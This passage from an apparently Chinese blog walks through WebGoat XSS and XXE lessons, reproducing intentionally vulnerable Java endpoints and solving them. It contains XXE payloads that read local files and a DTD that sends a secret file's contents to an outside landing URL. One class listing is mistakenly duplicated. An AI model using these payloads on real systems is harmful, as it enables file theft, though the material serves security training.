class="string">&quot;xss-mitigation-4-failed&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.owasp.validator.html.*;</span><br><span class="line"><span class="keyword">import</span> MyCommentDAO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AntiSamyController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveNewComment</span><span class="params">(<span class="type">int</span> threadID, <span class="type">int</span> userID, String newComment)</span>&#123;</span><br><span class="line">        <span class="type">Policy</span> <span class="variable">p</span> <span class="operator">=</span> Policy.getInstance(<span class="string">&quot;antisamy-slashdot.xml&quot;</span>);</span><br><span class="line">        <span class="type">AntiSamy</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntiSamy</span>();</span><br><span class="line">        <span class="type">CleanResults</span> <span class="variable">cr</span> <span class="operator">=</span> as.scan(newComment,p);</span><br><span class="line">        MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911125152801.png" alt="image-20220911125152801"></p>
<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXE</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xxe.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SimpleXXE"><a href="#SimpleXXE" class="headerlink" title="SimpleXXE"></a>SimpleXXE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.exec.OS;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.exception.ExceptionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;xxe.hints.simple.xxe.1&quot;, &quot;xxe.hints.simple.xxe.2&quot;, &quot;xxe.hints.simple.xxe.3&quot;, &quot;xxe.hints.simple.xxe.4&quot;, &quot;xxe.hints.simple.xxe.5&quot;, &quot;xxe.hints.simple.xxe.6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleXXE</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_LINUX_DIRECTORIES = &#123;<span class="string">&quot;usr&quot;</span>,<span class="string">&quot;etc&quot;</span>,<span class="string">&quot;var&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//    定义好linux系统下的目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_WINDOWS_DIRECTORIES = &#123;<span class="string">&quot;Windows&quot;</span>, <span class="string">&quot;Program Files (x86)&quot;</span>, <span class="string">&quot;Program Files&quot;</span>, <span class="string">&quot;pagefile.sys&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//   win</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webGoatHomeDirectory;</span><br><span class="line"><span class="comment">//    获取运行路径</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webwolf.landingpage.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webWolfURL;</span><br><span class="line"><span class="comment">//  获取webwolfurl</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentsCache comments;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;xxe/simple&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">createNameComment</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestBody</span> String commentStr)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);</span><br><span class="line"><span class="comment">//            解析获得comment对象</span></span><br><span class="line">            comments.addComment(comment,<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (checkSolution(comment))&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            error = ExceptionUtils.getStackTrace(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(error).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSolution</span><span class="params">(Comment comment)</span> &#123;</span><br><span class="line">        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String directory : directoriesToCheck)&#123;</span><br><span class="line">            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);</span><br><span class="line"><span class="comment">//            如果在评论中存在这些目录</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/xxe/sampledtd&quot;,consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String  <span class="title function_">getSampleDTDFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % file SYSTEM &quot;file:replace-this-by-webgoat-temp-directory/XXE/secret.txt&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://replace-this-by-webwolf-base-url/landing?text=%file;&#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">                %all;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommentsCache"><a href="#CommentsCache" class="headerlink" title="CommentsCache"></a>CommentsCache</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.exec.OS;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.exception.ExceptionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.JAXBException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;xxe.hints.simple.xxe.1&quot;, &quot;xxe.hints.simple.xxe.2&quot;, &quot;xxe.hints.simple.xxe.3&quot;, &quot;xxe.hints.simple.xxe.4&quot;, &quot;xxe.hints.simple.xxe.5&quot;, &quot;xxe.hints.simple.xxe.6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleXXE</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_LINUX_DIRECTORIES = &#123;<span class="string">&quot;usr&quot;</span>,<span class="string">&quot;etc&quot;</span>,<span class="string">&quot;var&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//    定义好linux系统下的目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_WINDOWS_DIRECTORIES = &#123;<span class="string">&quot;Windows&quot;</span>, <span class="string">&quot;Program Files (x86)&quot;</span>, <span class="string">&quot;Program Files&quot;</span>, <span class="string">&quot;pagefile.sys&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//   win</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webGoatHomeDirectory;</span><br><span class="line"><span class="comment">//    获取运行路径</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webgoat.landingpage.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webWolfURL;</span><br><span class="line"><span class="comment">//  获取webwolfurl</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentsCache comments;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;xxe/simple&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">createNameComment</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestBody</span> String commentStr)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);</span><br><span class="line"><span class="comment">//            解析获得comment对象</span></span><br><span class="line">            comments.addComment(comment,<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (checkSolution(comment))&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            error = ExceptionUtils.getStackTrace(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(error).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSolution</span><span class="params">(Comment comment)</span> &#123;</span><br><span class="line">        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String directory : directoriesToCheck)&#123;</span><br><span class="line">            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);</span><br><span class="line"><span class="comment">//            如果在评论中存在这些目录</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/xxe/sampledtd&quot;,consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String  <span class="title function_">getSampleDTDFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % file SYSTEM &quot;file:replace-this-by-webgoat-temp-directory/XXE/secret.txt&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://replace-this-by-webwolf-base-url/landing?text=%file;&#x27;&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">                %all;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Comment-1"><a href="#Comment-1" class="headerlink" title="Comment"></a>Comment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.annotation.XmlRootElement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="comment">// 类与xml文件进行映射</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Comment</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String dateTime;</span><br><span class="line">    <span class="keyword">private</span> String text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommentsEndpoint"><a href="#CommentsEndpoint" class="headerlink" title="CommentsEndpoint"></a>CommentsEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;xxe/comments&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommentsEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentsCache comments ;</span><br><span class="line">    <span class="meta">@GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Comment&gt; <span class="title function_">retrieveComments</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> comments.getComments();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单测试下</p>
<p>发现提交的是xml文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145600036.png" alt="image-20220911145600036"></p>
<p>新建一个文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145702591.png" alt="image-20220911145702591"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/Download/1.txt&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取下这个文件试试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145859718.png" alt="image-20220911145859718"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911145907661.png" alt="image-20220911145907661"></p>
<p>发现成功回显</p>
<p>这题通过需要获取c盘下的指定目录名</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911151413385.png" alt="image-20220911151413385"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911151501260.png" alt="image-20220911151501260"></p>
<h3 id="ContentTypeAssignment"><a href="#ContentTypeAssignment" class="headerlink" title="ContentTypeAssignment"></a>ContentTypeAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.exec.OS;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.exception.ExceptionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;xxe.hints.content.type.xxe.1&quot;, &quot;xxe.hints.content.type.xxe.2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContentTypeAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_LINUX_DIRECTORIES = &#123;<span class="string">&quot;usr&quot;</span>, <span class="string">&quot;etc&quot;</span>, <span class="string">&quot;var&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_WINDOWS_DIRECTORIES = &#123;<span class="string">&quot;Windows&quot;</span>, <span class="string">&quot;Program Files (x86)&quot;</span>, <span class="string">&quot;Program Files&quot;</span>, <span class="string">&quot;pagefile.sys&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webGoatHomeDirectory;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommentsCache comments;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;xxe/content-type&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">createNewUser</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestBody</span> String commentStr , <span class="meta">@RequestHeader(&quot;Content-Type&quot;)</span>String contentType)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (APPLICATION_JSON_VALUE.equals(contentType))&#123;</span><br><span class="line">            comments.parseJson(commentStr).ifPresent(c -&gt; comments.addComment(c,<span class="literal">true</span>));</span><br><span class="line">            attackResult = failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xxe.content.type.feedback.json&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);</span><br><span class="line">                comments.addComment(comment,<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (checkSolution(comment))&#123;</span><br><span class="line">                    attackResult = success(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                error = ExceptionUtils.getStackTrace(e);</span><br><span class="line">                attackResult = failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;xxe.content.type.feedback.xml&quot;</span>).output(error).build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> attackResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSolution</span><span class="params">(Comment comment)</span> &#123;</span><br><span class="line">        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES:DEFAULT_WINDOWS_DIRECTORIES;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String directory : directoriesToCheck)&#123;</span><br><span class="line">            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(),directory);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911153939378.png" alt="image-20220911153939378"></p>
<p>这个题目也不知道啥意思 不收json数据 但是前段发送的是json数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911154039782.png" alt="image-20220911154039782"></p>
<p>稍微修改一下</p>
<h4 id="BlindSendFileAssignment"><a href="#BlindSendFileAssignment" class="headerlink" title="BlindSendFileAssignment"></a>BlindSendFileAssignment</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.xxe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.WebGoat;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.nio.charset.StandardCharsets.UTF_8;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;xxe.blind.hints.1&quot;, &quot;xxe.blind.hints.2&quot;, &quot;xxe.blind.hints.3&quot;, &quot;xxe.blind.hints.4&quot;, &quot;xxe.blind.hints.5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlindSendFileAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String webGoatHomeDirectory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CommentsCache comments;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;WebGoatUser,String &gt; userToFileContents = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlindSendFileAssignment</span><span class="params">(<span 